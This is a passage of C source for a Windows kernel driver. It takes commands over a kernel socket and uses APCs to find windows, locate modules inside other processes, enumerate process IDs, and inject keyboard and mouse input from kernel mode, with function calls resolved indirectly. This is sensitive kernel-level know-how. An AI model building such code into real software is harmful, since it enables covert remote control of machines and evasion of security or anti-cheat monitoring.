	//	if (NT_SUCCESS(fNtos->PsLookupThreadByThreadId(tid, &Ethread)))
	//	{
	//		if (Flags){

	//			CHANGE_FUNCTION_ENTRY(RunApcSocketBuffer, Arg->_Run_Routine, PKKERNEL_ROUTINE);
	//		}
	//		else{
	//			CHANGE_FUNCTION_ENTRY(RunApc, Arg->_Run_Routine, PKKERNEL_ROUTINE);
	//		}

	//		fNtos->KeInitializeEvent(&Arg->Event, SynchronizationEvent, FALSE);

	//		LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, Arg->_Run_Routine, Flags, Arg->RunCode);

	//		fNtos->KeInitializeApc(&Arg->Apc, Ethread, 0, Arg->_Run_Routine, 0, (PKNORMAL_ROUTINE)pGData->RunApcNo.SelfTradition, KernelMode, Arg);
	//		
	//		pGData->wsk._SocketArry[s].Status = fNtos->KeInsertQueueApc(&Arg->Apc, Arg, Arg, 0);

	//		Ret = pGData->wsk._SocketArry[s].Status;

	//		fNtos->ObfDereferenceObject(Ethread);
	//	}
	//}
	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, 0, s);
	//fNtos->KfRaiseIrql(irql);
	if (Ret) return Ret;
	return (DWORD64)-1;
}

// 直接调用
DWORD64 RunApcRunCodeDirect(PVOID _pGData, SOCKET s, DWORD RunCode) {

	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;

	//KIRQL irql = KeGetCurrentIrql();
	//fNtos->KeLowerIrql(APC_LEVEL);
	//DWORD64 Ret = 0;
	//_FUNCTION_IMP(Get_Win32k_Process_Explorer, Ret, pGData);

	//IOINFO* pIO_INFO = Arg->rBuffer;

	//FREE_FUNCTION_ENTRY(RunApc, Arg->_Run_Routine);

	//NTSTATUS status = 0;
	//_sendEncrypt uSendEncrypt = 0;
	//_FUNCTION_ENTRY(sendEncrypt, uSendEncrypt, _sendEncrypt);
	//status = uSendEncrypt(pGData, Arg->s, 0x21212121, Arg->rBuffer, Arg->rLen);
	//FREE_FUNCTION_ENTRY(sendEncrypt, uSendEncrypt);


	SOCKET_INFO* sInfo = &pGData->wsk._SocketArry[s];
	PKSOCKET NowSocket = &pGData->wsk.bWsk.kSocket[s];
	int Flags = 0;
	if (RunCode > 0x80000000)
		Flags = 1;
	RUN_APC_ARG* Arg = &sInfo->_RunApcArg[Flags];

	Arg->RunCode = RunCode;
	Arg->s = s;
	Arg->_pGData = _pGData;
	fNtos->KeInitializeEvent(&NowSocket->AsyncContext.CompletionEvent, SynchronizationEvent, FALSE);
	pGData->wsk._SocketArry[s].List.Type = 4;


	MEMORY_FLAGS MFlags;
	PKKERNEL_ROUTINE uRunApc = 0;
	_FUNCTION_ENTRY(RunApc, MFlags, PKKERNEL_ROUTINE);
	uRunApc(&Arg->Apc, (PKNORMAL_ROUTINE*)0, (PVOID*)0, (PVOID*)&Arg, (PVOID*)0);
	FREE_FUNCTION_ENTRY(RunApc, MFlags);
	pGData->RunApcNo.SelfTradition(Arg, 0, 0);
	return (DWORD64)-1;
}




DWORD64  FindWindowW(PVOID _pGData, SOCKET s, PUNICODE_STRING lpClassName, PUNICODE_STRING lpWindowName){

	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;

	DWORD64 Ret = 0;
	_FUNCTION_IMP(Get_Win32k_Process_Explorer, Ret, pGData, 0);

	SOCKET_INFO* sInfo = &pGData->wsk._SocketArry[s];
	PKSOCKET NowSocket = &pGData->wsk.bWsk.kSocket[s];

	sInfo->_RunApcArg[0].RunCode = ARG_NtUserFindWindowEx;
	sInfo->_RunApcArg[0].s = s;
	sInfo->_RunApcArg[0]._pGData = _pGData;




	fNtos->KeInitializeEvent(&NowSocket->AsyncContext.CompletionEvent, SynchronizationEvent, FALSE);
	
	pGData->wsk._SocketArry[s].List.Type = 4;

	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, 0, s);


	//PEPROCESS eprocess;
	//if (!NT_SUCCESS(fNtos->PsLookupProcessByProcessId((HANDLE)Ret, &eprocess))) {

	//	return (DWORD64)-1;
	//}

	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr,__LINE__, 0, s);
	//HANDLE  tid = GetPrccessFirstThreadID(_pGData, eprocess);
	//fNtos->ObfDereferenceObject(eprocess);
	//PETHREAD Ethread = 0;
	//if (NT_SUCCESS(fNtos->PsLookupThreadByThreadId(tid, &Ethread)))
	//{
	//	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, 0, s);

	//	_FUNCTION_ENTRY(RunApc, sInfo->_RunApcArg._Run_Routine, PKKERNEL_ROUTINE);

	//	_FUNCTION_ENTRY(RunApcNo, sInfo->_RunApcArg._Normal_Routine, PKNORMAL_ROUTINE);

	//	fNtos->KeInitializeApc(&sInfo->_RunApcArg.Apc, Ethread, 0, 
	//		sInfo->_RunApcArg._Run_Routine, 0, sInfo->_RunApcArg._Normal_Routine, KernelMode, &sInfo->_RunApcArg);

	//	pGData->wsk._SocketArry[s].Status = fNtos->KeInsertQueueApc(&sInfo->_RunApcArg.Apc, 
	//		&sInfo->_RunApcArg, 
	//		&sInfo->_RunApcArg, 0);
	//	
	//	Ret = pGData->wsk._SocketArry[s].Status;

	//	fNtos->ObfDereferenceObject(Ethread);
	//}

	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr,__LINE__, 0, s);
	if (Ret) return Ret;
	return (DWORD64)-1;
}





ULONGLONG GetModuleBaseWow64(PVOID _pGData,  PEPROCESS pEProcess,
	 UNICODE_STRING usModuleName, DWORD* nSize)
{
	
	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)_pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)_pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &((Global_Data*)_pGData)->SelfAArry;

	ULONGLONG BaseAddr = 0;
	KAPC_STATE KAPC;
	fNtos->KeStackAttachProcess(pEProcess, &KAPC);
	PVOID pPeb = fNtos->PsGetProcessPeb(pEProcess);// getPeb(pEProcess); //

	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pPeb, 0);

	if (pPeb == NULL){
		fNtos->KeUnstackDetachProcess(&KAPC);
		return 0;
	}

//	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, BaseAddr, 0);


	if (fNtos->MmIsAddressValid(pPeb))
	{
		ULONG64 ldr = *(PULONG64)((ULONG64)pPeb + 0x18);
		if (fNtos->MmIsAddressValid((PVOID)ldr))
		{
			PLIST_ENTRY pListHead = (PLIST_ENTRY)(ldr + 0x10);


			for (PLIST_ENTRY pListEntry = (PLIST_ENTRY)(pListHead->Flink);
				pListEntry != pListHead;
				pListEntry = (PLIST_ENTRY)pListEntry->Flink)
			{
				PLDR_DATA_TABLE_ENTRY LdrEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

				if (LdrEntry->BaseDllName.Buffer == NULL)
				{
					continue;
				}

				//LOG_DEBUG("%wZ  %I64X \n", &LdrEntry->BaseDllName, LdrEntry->DllBase);
				// 当前模块名链表


				if (fNtos->MmIsAddressValid(LdrEntry->BaseDllName.Buffer))
				{
					UNICODE_STRING usCurrentName;
					fNtos->RtlInitUnicodeString(&usCurrentName, (PWCHAR)LdrEntry->BaseDllName.Buffer);

					// 比较模块名是否一致
					if (fNtos->RtlEqualUnicodeString(&usModuleName, &usCurrentName, TRUE))
					{
						BaseAddr = (ULONGLONG)LdrEntry->DllBase;
						*nSize = LdrEntry->SizeOfImage;
						//LOG_DEBUG("sucess %wZ  %I64X \n", &LdrEntry->BaseDllName, LdrEntry->DllBase);
						fNtos->KeUnstackDetachProcess(&KAPC);
						return BaseAddr;
					}
				}
			}
		} 
	}
	fNtos->KeUnstackDetachProcess(&KAPC);
	return 0;
}



inline int  ClientToScreenV(DWORD64 WndPtr, LPPOINT lpPoint)
{
	int result = 0; // rax
	int Flags = 0;
	Flags = *(WORD*)(WndPtr + 42) & 0x3FFF;
	if (Flags != 669)
	{
		if ((*(BYTE*)(WndPtr + 26) & 0x40) != 0) {
			lpPoint->x = *(DWORD*)(WndPtr + 112) - lpPoint->x;

		}
		else
		{
			lpPoint->x += *(DWORD*)(WndPtr + 104);
		}
		result = *(unsigned int*)(WndPtr + 108);
		lpPoint->y += (LONG)result;
	}
	return result;
}






void RunApc(PKAPC Apc, PKNORMAL_ROUTINE *NormalRoutine, PVOID  *NormalContext, PVOID *SystemArgument1, PVOID *SystemArgument2) {

	RUN_APC_ARG* Arg = (RUN_APC_ARG*)(*SystemArgument1);

	Global_Data* pGData = (Global_Data*)Arg->_pGData;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;
	WIN32K_FUN *fWin32k = &((Global_Data*)pGData)->fWin32k;
	SOCKET_INFO* pSocketInfo = &pGData->wsk._SocketArry[Arg->s];
	PKSOCKET pSocket = &pGData->wsk.bWsk.kSocket[Arg->s];

	//fNtos->KeRemoveQueueApc(Apc);

	SOCKET s = Arg->s;

	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr,__LINE__, NormalContext, Arg->s);
	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, NormalContext, Arg->RunCode);
	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, Arg->_Run_Routine, Arg->s, Arg->RunCode);
	DWORD64 Ret = 0;

	if (Arg->RunCode == ARG_NtUserFindWindowEx){

		PVOID addr = 0;
        size_t size = PAGE_SIZE;
		NTSTATUS status = STATUS_UNSUCCESSFUL;
			
		do{
			status = fNtos->ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_READWRITE);
			if (NT_SUCCESS(status) && addr != 0){
				break;
			}
		} while (1);
		
		fNtos->memset(addr, 0, PAGE_SIZE);

		char* _Begin = addr;
		wchar_t* pClass = (wchar_t*)_Begin;
		wchar_t* pWindow = (wchar_t*)(_Begin + 0x400);

		PUNICODE_STRING pUnicodeClass = (PUNICODE_STRING)(_Begin + 0x800);
		PUNICODE_STRING pUnicodeWindow = (PUNICODE_STRING)(_Begin + 0x900);


		fNtos->CopyMemory(pClass, Arg->u.fWindows.lpClassName.Buffer, Arg->u.fWindows.lpClassName.Length);

		fNtos->CopyMemory(pWindow, Arg->u.fWindows.lpWindowName.Buffer, Arg->u.fWindows.lpWindowName.Length);

		fNtos->RtlInitUnicodeString(pUnicodeClass, pClass);

		fNtos->RtlInitUnicodeString(pUnicodeWindow, pWindow);
		//RtlCopyMemory(Arg->lpClassName->Buffer)




		IOINFO* pIO_INFO = (IOINFO*)pGData->wsk._SocketArry[Arg->s]._RunApcArg[0].rBuffer;

		pIO_INFO->pAdr = fWin32k->NtUserFindWindowEx(0i64, 0i64, pUnicodeClass, pUnicodeWindow, 0);


		size = 0;
		fNtos->ZwFreeVirtualMemory(ZwCurrentProcess(), addr, &size, MEM_RELEASE);


		LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr,__LINE__, pIO_INFO->pAdr, Arg->s);


	}
	else if (Arg->RunCode == ARG_PROCESS_MOUDLE) {

		PEPROCESS eprocess;

		IOINFO* pIO_INFO = (IOINFO*)pGData->wsk._SocketArry[Arg->s]._RunApcArg[0].rBuffer;
		pIO_INFO->pVal = 0;
		pIO_INFO->pValSize = 0;

		if (NT_SUCCESS(fNtos->PsLookupProcessByProcessId(Arg->u.fMod.PID, &eprocess)))
		{
			LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, NormalContext, Arg->u.fMod.PID);
			UNICODE_STRING s2String;
			fNtos->RtlInitUnicodeString(&s2String, Arg->u.fMod.pUnicodeStr);

			LOG_DEBUG_CODE(AArry->Line_Ptr_WS.Ptr, __LINE__, eprocess, Arg->u.fMod.pUnicodeStr);
			
			DWORD nSzie = 0;
			_FUNCTION_IMP(GetModuleBaseWow64, Ret, pGData, eprocess, s2String, &nSzie);

			pIO_INFO->pVal = (PVOID)Ret;
			pIO_INFO->pValSize = nSzie;

			LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pIO_INFO->pVal, nSzie);
			fNtos->ObfDereferenceObject(eprocess);

			//LPCWSTR

			fNtos->ExFreePoolWithTag((char *)Arg->u.fMod.pUnicodeStr, 'Tag');
			Arg->u.fMod.pUnicodeStr = 0;
		}

	}
	else if (Arg->RunCode == ARG_PROCESS_PID) {

		UNICODE_STRING uNameProcess;
		fNtos->RtlInitUnicodeString(&uNameProcess, Arg->u.FProcess.pUnicodeStr);

		IOINFO* pIO_INFO = (IOINFO*)pGData->wsk._SocketArry[Arg->s]._RunApcArg[0].rBuffer;
		DWORD* dwPSize = (DWORD*)pIO_INFO->pVal;
		DWORD* pProcessArry = dwPSize + 1;
		_FUNCTION_IMP(FindProcessID, Ret, pGData, &uNameProcess, dwPSize, pProcessArry);
		pIO_INFO->pValSize = (*dwPSize + 1) * 4;
		Arg->rLen = pIO_INFO->pValSize;
	}
	else if (Arg->RunCode == ARG_NtUserSendInput) {

		PVOID addr = 0;
		size_t size = 100;

		do
		{
			NTSTATUS status = fNtos->ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (NT_SUCCESS(status) && addr != 0) {
				break;
			}
		} while (1);
		fNtos->CopyMemory(addr, &Arg->u.fEvent, 40);
		fWin32k->NtUserSendInput(1, addr, 40);
		//Win32k_NtUserSendInput(1, addr, 40);
		fNtos->ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_RELEASE);

	}
	else if (Arg->RunCode == ARG_NtUserGetForegroundWindow) {

	     IOINFO* pIO_INFO = (IOINFO*)pGData->wsk._SocketArry[Arg->s]._RunApcArg[0].rBuffer;

		 pIO_INFO->pAdr = fWin32k->NtUserGetForegroundWindow();

    }
	else if (Arg->RunCode == ARG_PostMessage) {
	
	     fWin32k->NtUserPostMessage(Arg->u.Msg.hWnd, Arg->u.Msg.Msg, Arg->u.Msg.wParam, Arg->u.Msg.lParam);
	     
    }
	else if (Arg->RunCode == ARG_NtUserSetWindowLongPtr) {

	     fWin32k->NtUserSetWindowLongPtr(Arg->u.Msg.hWnd, (int)Arg->u.Msg.lParam, Arg->u.Msg.wParam, 0);

    }
	else if (Arg->RunCode == ARG_NtUserCallHwndLock){

     	   fWin32k->NtUserCallHwndLock(Arg->u.Hwnd, fWin32k->SET_FORE_WINDW);
	}
	else if (Arg->RunCode == ARG_ClientToSccreen)
	{
	DWORD64  WndPtr = 0;
	if (fWin32k->NtUserMapDesktopObject)
	{
		WndPtr = fWin32k->NtUserMapDesktopObject(Arg->u.fPoint.Hwnd);
	}
	else
	{
		WndPtr = fWin32k->NtUserCallOneParam(Arg->u.fPoint.Hwnd, fWin32k->GET_tagHNW);
	}

	if (fNtos->MmIsAddressValid((PVOID)WndPtr)) {
		ClientToScreenV(WndPtr, (LPPOINT)Arg->u.fPoint.pPoint);
	}

	}
	else if (Arg->RunCode == ARG_NtUserEnumDisplaySettings)
	{
		PVOID addr = 0;
		size_t size = sizeof(DEVMODEW) + 0x100;
		NTSTATUS status = fNtos->ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_READWRITE);
		//LOG_DEBUG("NtUserEnumDisplaySettings  r %08X\n", Arg->r);
		if (NT_SUCCESS(status))
		{
			DEVMODEW* pSeting = addr;
			//RtlZeroMemory(addr, sizeof(DEVMODEW));
			fNtos->memset(addr, 0, sizeof(DEVMODEW));
			pSeting->dmSize = sizeof(DEVMODEW);
			pSeting->dmDriverExtra = 0;

			NTSTATUS r = fWin32k->NtUserEnumDisplaySettings(NULL, (DWORD)-1, pSeting, 0);
			///LOG_DEBUG("NtUserEnumDisplaySettings  r %08X\n", r);
			IOINFO* pIO_INFO = (IOINFO*)pGData->wsk._SocketArry[Arg->s]._RunApcArg[0].rBuffer;
			if (r >= 0) {

				//IOINFO* pIO_INFO = (IOINFO*)pGData->wsk._SocketArry[Arg->s]._RunApcArg[0].rBuffer;
				pIO_INFO->pAdrSize = pSeting->dmPelsWidth;
				pIO_INFO->pValSize = pSeting->dmPelsHeight;
				//RtlCopyMemory(Arg->Ptr, pSeting, sizeof(DEVMODEW));
				//Arg->r = 1;
			}
			else
			{
				pIO_INFO->Error = 2;
			}
			//size = 0;
			fNtos->ZwFreeVirtualMemory(ZwCurrentProcess(), &addr, &size, MEM_RELEASE);
		}


	}




	// 			//	pValue->pAdrSize = DevMod.dmPelsWidth;
			//	pValue->pValSize = DevMod.dmPelsHeight;
	//fNtos->KeRemoveQueueApc(Apc);
	//fNtos->KeSetEvent(&Arg->Event, IO_NO_INCREMENT, FALSE);
}




void RunApcSocketBuffer(PKAPC Apc, PKNORMAL_ROUTINE * NormalRoutine, PVOID* NormalContext,PVOID *SystemArgument1, PVOID* SystemArgument2) 
{


	RUN_APC_ARG* Arg = (RUN_APC_ARG*)(*SystemArgument1);
	Global_Data* pGData = (Global_Data*)Arg->_pGData;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;
	//WIN32K_FUN* fWin32k = &((Global_Data*)pGData)->fWin32k;
	//SOCKET_INFO* pSocketInfo = &pGData->wsk._SocketArry[Arg->s];
	//PKSOCKET pSocket = &pGData->wsk.bWsk.kSocket[Arg->s];
	DWORD64 Ret = 0;

	//fNtos->KeRemoveQueueApc(Apc);

	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, Arg->_Run_Routine, Arg->RunCode, Arg->s);

	if (Arg->RunCode == 0x80000001){
	
		//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, NormalRoutine, Arg->s);
		//_FUNCTION_IMP(IOSocketBuffer, Ret, Arg->u.RunApc.pGData, Arg->u.RunApc.s, Arg->u.RunApc.IOMajor, Arg->u.RunApc.pInfo, Arg->u.RunApc.rBuffer);
	}
	//fNtos->KeSetEvent(&Arg->Event, IO_NO_INCREMENT, FALSE);
}



void RunApcNo( PVOID NormalContext,
	 PVOID SystemArgument1,
	 PVOID SystemArgument2) {

	// 不能使用  FUNCTION_IMP
	__try {
		RUN_APC_ARG* Arg = (RUN_APC_ARG*)(NormalContext);
		Global_Data* pGData = (Global_Data*)Arg->_pGData;
		NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;

		SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
		SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;
		PKSOCKET pSocket = &pGData->wsk.bWsk.kSocket[Arg->s];
		SOCKET_INFO* pSocketInfo = (SOCKET_INFO*)&pGData->wsk._SocketArry[Arg->s];



		LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, Arg->_Run_Routine, Arg->RunCode, Arg->s);

		int Flags = 0;
		if (Arg->RunCode > 0x80000000)
			Flags = 1;
		IOINFO* pIO_INFO = Arg->rBuffer;

		//FREE_FUNCTION_ENTRY(RunApc, Arg->_Run_Routine);

		//FREE_FUNCTION_ENTRY(pKer, pMdl);

		if (Flags)return;

		NTSTATUS status = 0;

		MEMORY_FLAGS MFlags;

		SOCKET s = Arg->s;

		_sendEncrypt usendEncrypt = 0;
		_FUNCTION_ENTRY(sendEncrypt, MFlags, _sendEncrypt);
		status = usendEncrypt(pGData, Arg->s, 0x21212121, Arg->rBuffer, Arg->rLen);
		FREE_FUNCTION_ENTRY(sendEncrypt, MFlags);

		if (!NT_SUCCESS(status))
		{
			if (pSocket->AsyncContext.Irp != 0) {
				fNtos->IoFreeIrp(pSocket->AsyncContext.Irp);
				pSocket->AsyncContext.Irp = 0;
			}
			if (pSocketInfo->kSendBuffer.Mdl != 0) {

				//fNtos->ExFreePoolWithTag(pSocketInfo->pSendBuffer, 'Tag');
				fNtos->MmFreeContiguousMemory(pSocketInfo->pSendBuffer);
				//fNtos->MmUnlockPages(pSocketInfo->kSendBuffer.Mdl);
				fNtos->IoFreeMdl(pSocketInfo->kSendBuffer.Mdl);
				pSocketInfo->kSendBuffer.Mdl = 0;
				//fNtos->MmFreeNonCachedMemory(pSocketInfo->pSendBuffer, SEND_SIZE);
				pSocketInfo->pSendBuffer = 0;

			}
			if (pSocketInfo->kRecvBuffer.Mdl != 0)
			{
				//fNtos->MmUnlockPages(pSocketInfo->kRecvBuffer.Mdl);

				//fNtos->ExFreePoolWithTag(pSocketInfo->pRecvBuffer, 'Tag');

				fNtos->MmFreeContiguousMemory(pSocketInfo->pRecvBuffer);

				fNtos->IoFreeMdl(pSocketInfo->kRecvBuffer.Mdl);
				pSocketInfo->kRecvBuffer.Mdl = 0;
				//fNtos->MmFreeNonCachedMemory(pSocketInfo->pRecvBuffer, RECV_SIZE);
				pSocketInfo->pRecvBuffer = 0;
			}


			//fNtos->KeWaitForSingleObject()

			//KeAcquireSpinLock


			//KeReleaseSpinLock()
			ChangeEntryList(pGData, pGData->wsk.s_Sever, &pSocketInfo->List.Link, &pSocketInfo->List.Link, 0);
			//RemoveEntryList(&pSocketInfo->List.Link);
		}
	}
	__except (1) {


	}


}

void _WORKER_THREAD_ROUTINE(PVOID Parameter) {
	WORKER_THREAD_INFO* pWorkInfo = (WORKER_THREAD_INFO*)Parameter;
	Global_Data* pGData = (Global_Data*)pWorkInfo->pGData;
	NTOSKRNL_FUN* fNtos = &pGData->fNtos;
	SELF_F_ARRY* fArry = &pGData->SelfFArry;
	SOCKET s = pWorkInfo->s;
	DWORD64 Ret = 0;
	_FUNCTION_IMP(RunApcRunCode, Ret, pGData, pWorkInfo->s, pWorkInfo->Flags);
}

void _WORKER_THREAD_ROUTINE_ACCEPT_SEND_RECV(PVOID Parameter) {
	PWSK_COMPLETION_ROUTINE pWskCompletionRoutine = (PWSK_COMPLETION_ROUTINE)Parameter;
	Global_Data* pGData = (Global_Data*)pWskCompletionRoutine->pGData;
	SELF_F_ARRY* fArry = &pGData->SelfFArry;
	NTOSKRNL_FUN* fNtos = &pGData->fNtos;
	DWORD64 Ret = 0;  SOCKET s = pWskCompletionRoutine->s;
	SELF_STRING_ARRY* AArry = &pGData->SelfAArry;
	WSK_SERVER_INFO* WskInfo = &pGData->wsk;
	if (pWskCompletionRoutine->Flags == 2) {
		_FUNCTION_IMP(ACCEPT_ROUTINE, Ret, pGData, pWskCompletionRoutine->s);
	}
	else {
		_FUNCTION_IMP(RECV_SEND_ROUTINE, Ret, pGData, pWskCompletionRoutine->s, pWskCompletionRoutine->Flags);
	}
}


void _Work_Memory(PVOID Parameter) {
	WORKER_T_INFO* pWorkInfo = (WORKER_T_INFO*)Parameter;
	Global_Data* pGData = (Global_Data*)pWorkInfo->pGData;
	NTOSKRNL_FUN* fNtos = &pGData->fNtos;
	SELF_F_ARRY* fArry = &pGData->SelfFArry;
	DWORD64 Ret = 0;
	SOCKET s = pWorkInfo->s;
	_FUNCTION_IMP(IOSocketBuffer, Ret, pGData, pWorkInfo->s, pWorkInfo->IOMajor, pWorkInfo->pInfo, pWorkInfo->rBuffer);
}

typedef struct _KEYBD_INFO
{
	int v4; // [rsp+20h] [rbp-38h] BYREFi
	int v4_2;
	__int16 v5; // [rsp+28h] [rbp-30h]
	__int16 v6; // [rsp+2Ah] [rbp-2Eh]
	ULONG v7; // [rsp+2Ch] [rbp-2Ch]
	int v8; // [rsp+30h] [rbp-28h]
	int v8_2;
	ULONG_PTR v9; // [rsp+38h] [rbp-20h]
	ULONG_PTR v9_2;
}KEYBD_INFO;

NTSTATUS Brother_KeyBoard(PVOID _pGData, SOCKET s, LPIOINFO pValue) {


	NTSTATUS rError = STATUS_SUCCESS;
	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &pGData->fNtos;
	SELF_F_ARRY* fArry = &pGData->SelfFArry;
	SELF_STRING_ARRY* AArry = &pGData->SelfAArry;

	SOCKET_INFO* pSocketInfo = &pGData->wsk._SocketArry[s];
	PKSOCKET pSocket = &pGData->wsk.bWsk.kSocket[s];

	DWORD64 Ret = 0;

	//LOG_DEBUG("Brother_KeyBoard PID:%d Type :%d\n", pValue->pID, pValue->Type);
	//if (pValue->Type == 0 || pValue->Type == 1)
	//{
	//	AddKeyBoard((HANDLE)pValue->pID, pValue->pAdrSize, pValue->Type);
	//}
	//else if (pValue->Type == 2)
	//{
	//	StopKeyBoard((HANDLE)pValue->pID, pValue->Type);
	//}
	//else if (pValue->Type == 3)
	//{
	//	AddInputData((HANDLE)pValue->pID, (RAWINPUT*)pValue->pAdr);
	//}
	//else if (pValue->Type == 4)
	//{
	//	SetRawInput((HRAWINPUT)pValue->pAdr);
	//}
	 if (pValue->Type == 5)
	{
		MOUSE_EVENT* pMouse = (MOUSE_EVENT*)pValue->pAdr;

		//sizeof(MOUSE_EVENT)

		DWORD v5[10]; // [rsp+20h] [rbp-38h] BYREF

		fNtos->memset(v5, 0, sizeof(v5));

		v5[0] = 0;
		v5[2] = pMouse->dx;
		v5[3] = pMouse->dy;
		v5[4] = pMouse->dwData;
		v5[5] = pMouse->dwFlags;
		v5[6] = 0;
		*(ULONG_PTR*)&v5[8] = pMouse->dwExtraInfo;

		fNtos->CopyMemory(&pSocketInfo->_RunApcArg[0].u.fEvent, v5, 40);

		////LOG_DEBUG("pMouse->dwFlags:%08X pMouse->dx:%08X pMouse->dy:%08X pMouse->dwData:%08X pMouse->dwExtraInfo:%08X\n",
		////	pMouse->dwFlags, pMouse->dx, pMouse->dy, pMouse->dwData, pMouse->dwExtraInfo);

		////mouse_event(pMouse->dwFlags, pMouse->dx, pMouse->dy, pMouse->dwData, pMouse->dwExtraInfo);
	}
	else if (pValue->Type == 6)
	{
		 KETBD_EVENT* pKeybd = (KETBD_EVENT*)pValue->pAdr;
		 
		 //

		 KEYBD_INFO TKeyBoard;

		 fNtos->memset(&TKeyBoard, 0, sizeof(KEYBD_INFO));

		 TKeyBoard.v4 = 1;
		 TKeyBoard.v5 = pKeybd->bVk;
		 TKeyBoard.v6 = pKeybd->bScan;
		 TKeyBoard.v7 = pKeybd->dwFlags;
		 TKeyBoard.v8 = 0;
		 TKeyBoard.v9 = pKeybd->dwExtraInfo;

		 fNtos->CopyMemory(&pSocketInfo->_RunApcArg[0].u.fEvent, &TKeyBoard, 40);

		//keybd_event(pKeybd->bVk, pKeybd->bScan, pKeybd->dwFlags, pKeybd->dwExtraInfo);
	}



	 pSocketInfo->_RunApcArg[0].rBuffer = pValue;
	 pSocketInfo->_RunApcArg[0].rLen = sizeof(IOINFO);

	// _FUNCTION_IMP(RunApcRunCodeDirect, Ret, pGData, s, ARG_NtUserSendInput);

	 _FUNCTION_IMP(RunApcRunCode, Ret, _pGData, s, ARG_NtUserSendInput);
	return STATUS_SUCCESS;
}

NTSTATUS NTAPI Brother_Moudle(PVOID _pGData, SOCKET s, LPIOINFO pValue) {

	NTSTATUS rError = STATUS_SUCCESS;
	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &pGData->fNtos;
	SELF_F_ARRY* fArry = &pGData->SelfFArry;
	SELF_STRING_ARRY* AArry = &pGData->SelfAArry;

	SOCKET_INFO* pSocketInfo = &pGData->wsk._SocketArry[s];
	PKSOCKET pSocket = &pGData->wsk.bWsk.kSocket[s];

	DWORD64 Ret = 0;

	if (pValue->Type == 0) {

		pSocketInfo->_RunApcArg[0].u.fMod.pUnicodeStr = 0;

		pSocketInfo->_RunApcArg[0].u.fMod.PID = (HANDLE)pValue->pID;

		Ret = (DWORD64)-1;

		if (pValue->pAdrSize < MAX_PATH * 2){

			LPCWSTR pWchar = 0;
			do
			{
				pWchar = fNtos->ExAllocatePoolWithTag(NonPagedPool, (MAX_PATH + 1) * 2, 'Tag');
			} while (pWchar == 0);

			fNtos->memset((char *)pWchar, 0, (MAX_PATH + 1) * 2);

			fNtos->CopyMemory((void *)pWchar, pValue->pAdr, pValue->pAdrSize);

			pSocketInfo->_RunApcArg[0].u.fMod.pUnicodeStr = pWchar;
				

			pSocketInfo->_RunApcArg[0].rBuffer = pValue;
			pSocketInfo->_RunApcArg[0].rLen = sizeof(IOINFO);



			
			//IoAllocateWorkItem()

			//fNtos->RtlInitUnicodeString(&pSocketInfo->_RunApcArg.u.fMod.name, pWchar);
			_FUNCTION_IMP(RunApcRunCode, Ret, _pGData, s, ARG_PROCESS_MOUDLE);
			//pSocketInfo->_RunApcArg[0].s = s;
			//pSocketInfo->_RunApcArg.RunCode = ;

			//_FUNCTION_IMP(RunApcRunCodeDirect, Ret, pGData, s, ARG_PROCESS_MOUDLE);


		}


		//if (Ret == (DWORD64)-1) {

		//	_sendEncrypt uSendEncrypt = 0;
		//	_FUNCTION_ENTRY(sendEncrypt, uSendEncrypt, _sendEncrypt);
